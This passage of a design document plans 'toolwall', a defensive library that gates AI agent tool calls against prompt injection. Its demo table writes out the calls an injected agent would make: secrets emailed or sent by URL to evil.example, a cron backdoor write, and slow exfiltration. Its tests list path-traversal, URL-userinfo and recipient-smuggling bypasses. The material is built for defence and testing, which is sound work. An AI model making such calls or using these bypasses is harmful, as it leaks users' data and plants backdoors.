### M9 (stretch, drop if the clock runs out) — Live-model demo arm · Size: S/M

**Goal.** Show the same blocks against a real model rather than a scripted one,
so the demo is not vulnerable to "your fake agent was rigged".

**Files.** `toolwall/demo.py` (add `--model` branches),
`pyproject.toml` (`[project.optional-dependencies] llm = ["anthropic", "openai"]`),
`.env.example`.

**Details.** Reuse the sibling project's adapter shape exactly:
`chat(model, messages, tools, temperature=0.0)` with `anthropic` / `openai` /
`mock` branches, imported lazily so the core library and the default demo never
import a provider SDK. Scenarios feed the model tool results containing the
injected instruction; whatever tool calls it makes are routed through the same
two arms. Results are illustrative, not a benchmark — no ASR table, no
leaderboard. If the model refuses the injection, the demo reports that honestly
rather than retrying until it complies.

**Acceptance criteria.**
1. `toolwall-demo --model mock` still works with the `llm` extra uninstalled
   (assert the provider SDKs are never imported at module load).
2. `toolwall-demo --model sonnet` (with `ANTHROPIC_API_KEY` set) runs the same
   six scenarios and prints the same table plus a per-scenario note on whether
   the model actually attempted the attacker's action.
3. Any tool call the live model makes in the protected arm is routed through
   `check()` — a test with a stubbed `chat()` asserts no code path executes a
   tool without a decision.
4. No test in `pytest` requires an API key.

---

**Suggested sequencing on a 1.5-2.5 week part-time budget.**
Week 1: M1, M2 (M2 is the longest and most important — start it early), M3, M4.
Week 2: M5, M6, M7. Spillover: M8, then M9 only if comfortable. M7 is the
milestone that must not be cut; if the schedule collapses, drop M9 entirely,
then reduce M7 to four scenarios, and only then trim README polish.

---

## 5. Policy types for v1

Four types. Each is a factory in `policies.py` and a YAML key in `loader.py`.

### 5.1 Tool allow/deny-list

`tool_allowlist(names)` / `tool_denylist(names)`. Matching is on the normalised
tool name (NFKC + casefold). `"*"` matches everything. An allow-list entry
returns `ALLOW`; a deny-list entry returns `DENY`; a non-match returns `None`,
so a tool nobody mentioned falls through to `default`.

The intended posture is `default: deny` with an explicit allow-list per agent —
"this research agent may call `web_search`, `read_file`, and nothing else" is
one line of YAML and eliminates entire attack classes (`hijack_tool_chain`,
`hijack_db_write`) outright.

### 5.2 Argument rules

`arg_rules(rules)` — per `(tool, arg)`, with `"*"` wildcards on both. Supported
constraints:

| Constraint | Meaning | Violation |
|---|---|---|
| `required: true` | the argument must be present and not `None` | DENY |
| `type: str\|int\|float\|bool\|list\|dict` | Python type check (`bool` is not accepted as `int`) | DENY |
| `max_len: N` | `len()` of a string or collection | DENY |
| `enum: [...]` | value must be one of these | DENY |
| `matches: <regex>` | the value **must** match (anchor it yourself) | DENY |
| `denies: <regex>` | no string anywhere in the value tree may match | DENY, or redact if `on_violation: redact` |
| `allow_hosts: [...]` | the value's host (URL, email, or bare host) must be listed; leading `.` matches subdomains | DENY |
| `on_violation: deny\|redact` | applies to `denies` only; default `deny` | — |

The three that do the real work in practice:

- **`matches` on a path argument** (`^/workspace/`) turns "destructive file
  write" from a live risk into a denied call. Note this is a *policy* check, not
  path canonicalisation — the README says so, and the rule as written is
  defeated by `/workspace/../etc/passwd`. v1 therefore also denies any string
  value containing `..` when `matches` is present on the same argument. (Doing
  real path resolution would require knowing the tool's cwd, which the library
  does not and should not.)
- **`allow_hosts` on a recipient or URL argument** is the exfiltration blocker.
  Its parsing rules are deliberately paranoid (§4 M2): userinfo tricks,
  comma-smuggled second recipients, unparseable values, and IDNA failures all
  deny.
- **A global `"*"/"*"` `denies` pattern** catches secret-shaped tokens
  (`CANARY-[0-9A-F]{4}`, `sk-[A-Za-z0-9]{20,}`) leaving through *any* tool's
  *any* argument, including ones nobody thought to write a rule for. This is the
  rule that survives an unimagined attack.

### 5.3 Rate limiting

`rate_limit(tool, max_calls, per_seconds, key=())`. Sliding window over
`time.monotonic()`, in-process, keyed on the tool plus zero or more context
fields. Only allowed calls consume budget (§4 M3). Exceeding the window denies.

This covers the resource-abuse and tool-loop cases, and — more usefully in
practice — bounds the blast radius of a successful injection: an agent talked
into exfiltrating data one `http_get` at a time gets five requests, not five
hundred.

### 5.4 Sensitive-action escalation

`sensitive(tools)` returns `Decision(ESCALATE, ...)` for the named tools; the
engine resolves it via the escalation callback after all other policies have had
their say. Full contract in §6.

The intended use is the small set of irreversible, high-consequence tools —
`submit_order`, `send_email` to an external domain, `delete_*`, `run_query` with
writes — where the right answer is not "block" (that breaks the agent) and not
"allow" (that is how the money leaves), but "ask".

**Deliberately not in v1:** conditional escalation in YAML (`amount > 100`),
time-of-day rules, quota-by-cost, argument-value-dependent tool allow-listing.
Each is one Python function against the documented `Policy` signature, and each
would otherwise be the first brick in a config language.

---

## 6. The sensitive-action escalation primitive

A library with no UI cannot ask a human anything. So it defines the *contract*
and ships two trivial implementations, and that is the whole feature.

**The contract.** `escalate: Callable[[ToolCall, Decision], bool]`, supplied to
`Toolwall(...)`. Invoked at most once per `check()`, only when the decision has
resolved to a pending escalation and nothing has denied. Returns `True` to
approve; anything else denies.

**"Anything else denies" is literal and deliberate.** `False`, `None`, a truthy
non-bool like `"yes"` or `1`, or a raised exception all resolve to `DENY`. A
callback that hangs is the caller's problem (it blocks the caller's thread by
design), but a callback that returns something ambiguous must not be interpreted
generously — the failure mode of a permissive interpretation is an approved
purchase nobody approved. The engine checks `result is True`.

**Shipped implementations, both in `engine.py`:**

- **`auto_deny(call, decision) -> False`** — the default. A headless service that
  never configures escalation gets deterministic denials, never a process
  blocked on stdin. This is the correct default for CI, servers, and anyone who
  installed the library and didn't read this far.
- **`cli_confirm(call, decision) -> bool`** — prints the tool name, the
  pretty-printed arguments, and the reason, then reads one line from stdin.
  Accepts only `y`/`yes` after `.strip().casefold()`. If `sys.stdin.isatty()` is
  false it returns `False` immediately without reading, so piping into a script
  denies rather than hangs or consumes the pipe.

**What the audit log records.** `escalated: true` plus `approved: true|false`.
An approval is therefore attributable after the fact, which is the actual point
of a human-in-the-loop step — a confirmation nobody can reconstruct is theatre.

**Deliberately not built:** no queue, no async approval, no webhook/Slack
integration, no timeout with a default action, no approval caching ("approve
this tool for the rest of the session"), no multi-approver policy. Every one of
those is a real product feature and none of them is a *library* feature — they
all live in the caller's callback, which is exactly why the callback is the
extension point. The README shows a ten-line Slack-webhook callback as an
example rather than shipping one.

---

## 7. The demo

The single most important artifact. `toolwall-demo`, offline, under five
seconds, six scenarios, two arms, one table.

**Scenario shapes** mirror the taxonomy in `agent-injection-bench`
(data exfiltration, unauthorized action, destructive action, resource abuse) so
the two projects visibly compose — but the code is independent: no import, no
shared fixtures, no submodule. Same threat shapes, different repo.

| # | ID | Attacker goal | The tool call the fooled agent makes | Blocked by |
|---|---|---|---|---|
| 1 | `exfil_email` | Data exfiltration | `send_email(to="attacker@evil.example", body="...CANARY-7F3A...")` | `arg_rules:send_email.to` (`allow_hosts`) - and independently by the global `denies` canary rule |
| 2 | `exfil_url` | Data exfiltration | `http_get(url="https://evil.example/log?d=CANARY-7F3A")` | `arg_rules:http_get.url` (`allow_hosts`) |
| 3 | `unauthorized_purchase` | Unauthorized action | `submit_order(sku="X", amount=499)` | `sensitive:submit_order` → `auto_deny` |
| 4 | `destructive_write` | Destructive action | `write_file(path="/etc/cron.d/backdoor", content="...")` | `arg_rules:write_file.path` (`matches: ^/workspace/`) |
| 5 | `exfil_flood` | Resource abuse / slow exfiltration | `http_get` × 20 to an allowed host, one secret byte at a time | `rate_limit:http_get` (5 per 60s) |
| 6 | `benign_control` | *(none - the legitimate task)* | `read_file("/workspace/notes.md")` then `send_email(to="teammate@example.com", ...)` | **not blocked** - must be allowed end to end |

Scenario 1 is deliberately double-covered (host rule *and* canary rule) to
demonstrate defence in depth and to make the point that the global pattern rule
catches things no tool-specific rule anticipated. Scenario 6 exists because a
demo without a benign control is indistinguishable from `default: deny` and
nothing else.

**Both arms, per scenario.** The `unprotected` arm calls the fake tools directly
and the demo **asserts the attack succeeded** — `world.sent_emails[0]["to"] ==
"attacker@evil.example"`, `world.orders != []`, `"/etc/cron.d/backdoor" in
world.files_written`. Then the world is reset and the `protected` arm routes the
identical call sequence through the engine and asserts the world is clean.

**Output** (this block goes in the README):

```
scenario               goal                  unprotected   protected   blocked by
exfil_email            data exfiltration     LEAKED        BLOCKED     arg_rules:send_email.to
exfil_url              data exfiltration     LEAKED        BLOCKED     arg_rules:http_get.url
unauthorized_purchase  unauthorized action   ORDERED       BLOCKED     sensitive:submit_order
destructive_write      destructive action    WRITTEN       BLOCKED     arg_rules:write_file.path
exfil_flood            resource abuse        20 requests   5 requests  rate_limit:http_get
benign_control          (legitimate task)     OK            OK          - (allowed)

blocked 5/5 attacks, allowed 1/1 benign task. audit: outputs/demo-audit.jsonl (31 records)
```

**Exit code is the claim.** `main()` returns 1 if any scenario's actual outcome
differs from its declared expectation, so the table cannot go stale silently and
`tests/test_demo.py` gets the whole integration test for free.

**What the demo does not claim.** It does not claim a model would be fooled at
any particular rate - that measurement is `agent-injection-bench`'s job, and the
README links there rather than inventing a number. The demo's claim is narrower
and fully supported: *given* a tool call an injected agent would make, toolwall
denies it, and *given* the legitimate task, toolwall permits it.

---

## 8. Testing strategy

`pytest`, offline, no API keys, under 10 seconds, no fixtures framework beyond
plain functions. Coverage target is stated as behaviour, not a percentage:
**every edge case below has a named test**, and the test name says which one.

**Fail-closed behaviour** - the property that matters most:
- Engine with zero policies and `default=deny` denies everything (M1).
- A policy raising any exception yields `DENY`, not a fall-through (M1).
- Malformed YAML / non-mapping YAML / empty file → `PolicyError`, no engine
  constructed, no partial policy list (M6).
- A policy file with no `default` key is rejected outright (M6).
- Unknown YAML keys are rejected, not ignored - a typo'd `allw: true` must not
  silently drop a rule (M6).
- Unparseable or hostless values under `allow_hosts` deny (M2).
- An escalation callback that raises or returns a non-`True` value denies (M5).
- Depth/size limits exceeded during the nested-value scan deny rather than
  truncate the scan (M2).

**No-bypass tricks:**
- Tool-name case: `SEND_EMAIL`, `Send_Email` hit a `send_email` rule (M2).
- Tool-name Unicode: fullwidth `ｓｅｎｄ＿ｅｍａｉｌ` NFKC-normalises and hits
  the same rule (M2).
- Argument-key confusables: ASCII `to` and Cyrillic `tо` present together →
  `DENY` for ambiguity; Cyrillic `tо` alone still matches the `to` rule (M2).
- Nested payloads: a canary inside a list, inside a dict value, and inside a
  list-of-dicts are all found (M2).
- URL userinfo: `https://example.com@evil.example/` resolves to `evil.example`
  and denies (M2).
- Recipient smuggling: `"ok@example.com, attacker@evil.example"` in a string arg
  denies (M2).
- Subdomain: `sub.example.com` denies for `[example.com]`, allows for
  `[.example.com]` (M2).
- Path traversal: `/workspace/../etc/passwd` denies under
  `matches: ^/workspace/` (M2/§5.2).
- Rate-limit evasion: denied calls do not consume budget, and rate-limited calls
  do not extend the window (M3).
- Ordering: an escalating policy never prompts when another policy denies (M5).

**Policy-loader validation:** one test per rejection case in M6 (≥10), each
asserting both the exception type and that the message names the offending key
path.

**Audit integrity:** one record per check including allows; redaction leaves no
plaintext secret in the serialised line; flushed per line; non-serialisable
values do not break the write; a record exists even when the decision path
raised (M4).

**Invariants worth their own tests:** `check()` never mutates the caller's args;
`call()` never invokes the function on a non-`ALLOW` decision; concurrency
correctness of the rate limiter is asserted exactly, not approximately.

**Integration:** `tests/test_demo.py` runs the full six-scenario demo in-process
and asserts world state in both arms (M7), including a flipped-expectation case
proving the self-check actually fails when it should.

---

## 9. Definition of done for v1

v1 ships when **all** of the following are true:

1. From a fresh clone in a clean venv: `pip install -e ".[dev]"` succeeds, then
   `pytest` passes offline with no API keys set, in under 10 seconds.
2. `toolwall-demo` exits 0, prints the §7 table, blocks 5/5 attacks, allows 1/1
   benign task, and writes an audit log with allows and denies both.
3. All four v1 policy types (§5) exist, are constructible in Python, and are
   expressible in the YAML/JSON policy file.
4. `python -m toolwall.loader --validate <file>` exits 0 on the demo policy and
   exits 1 with a key-path error message on each malformed variant.
5. Every edge case in §8 has a named, passing test.
6. `python -m build` produces an sdist and a wheel; installing the wheel into a
   temp venv and running `toolwall-demo` works (package data included).
7. README is under ~150 lines, leads with the demo table, contains a working
   15-line usage snippet, a policy YAML example, three integration snippets, and
   an honest "what this is not / threat model limitations" section.
8. `toolwall.__version__ == "0.1.0"`, matching `pyproject.toml`; repo tagged
   `v0.1.0` and pushed to `github.com/euisuh/agent-toolwall`; MIT licensed;
   working tree under 5 MB.

Anything not on this list is v2. If the schedule slips, the *only* sanctioned
cuts are: M9 (live-model arm, drop entirely), the demo scenario count (6 → 5,
dropping `exfil_flood` but never `benign_control`), and the README integration
snippets (3 → 1). Cutting the anti-bypass tests (§8), the audit log, or the
benign control scenario is not permitted - those are what make the artifact
credible rather than a toy.

---

## 10. Explicit non-goals for v1

- **Content filtering of any kind.** No prompt scanning, no output moderation,
  no injection detection, no PII classifier. Toolwall sees `(tool, args,
  context)` and nothing else. Guardrails/NeMo/Rebuff occupy that space; pairing
  with them is a README paragraph, not a feature.
- **Sandboxing or capability enforcement.** Toolwall is a chokepoint the
  application opts into. It cannot stop a tool invoked by a path that does not
  go through `check()`, and the README says so in those words.
- **A policy language.** No Rego, no CEL, no expression evaluator, no
  conditional escalation in YAML. Four rule types plus a Python callable.
- **Framework adapters as shipped modules.** No LangChain / LlamaIndex /
  CrewAI / MCP integration packages. Snippets in the README instead.
- **Async API.** No `acheck()`, no async escalation.
- **Distributed or persistent state.** No Redis, no database, no shared rate
  limit across processes, no policy hot-reload.
- **A UI, dashboard, or approval service.** The escalation callback is the
  boundary; what is on the other side of it is not this library's problem.
- **Tamper-evident logging.** Plain JSONL. No hash chain, no signatures, no
  log shipping.
- **RBAC / multi-tenancy / subject modelling.** `context` is a free dict.
- **A benchmark, a leaderboard, or ASR numbers.** That is
  `agent-injection-bench`. This repo's demo demonstrates blocking; it does not
  measure susceptibility, and it must not grow a results table.
- **A PyPI release.** `pip install -e .`, a built wheel, and a git tag are the
  bar for v1. Publishing is a five-minute task whenever it becomes useful and is
  not a prerequisite for the artifact being reviewable.
- **Performance work.** No benchmarking, no caching, no fast paths. If `check()`
  is not sub-millisecond, that is a bug to fix when observed, not a milestone.
